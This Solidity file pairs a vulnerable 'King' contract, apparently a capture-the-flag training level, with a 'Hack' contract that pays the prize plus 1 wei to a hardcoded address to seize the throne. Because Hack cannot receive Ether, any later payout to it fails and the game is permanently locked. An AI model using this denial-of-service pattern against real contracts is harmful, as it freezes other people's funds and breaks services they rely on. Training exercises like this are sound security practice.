// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Hack {
    address payable target = payable(0x9bF9d8Dc0157AE86397961B879bd196217d8545f);
    King king = King(target);

    function getKing() public view returns(uint256){
        return king.prize();
    }

    function becomeKing()  public payable{
        uint amount = getKing();
        (bool success,) = target.call{value: amount+1 wei}("");
        require(success,"transation failed");
    }

    function getOwner() public view returns(address){
        return king.owner();
    }

}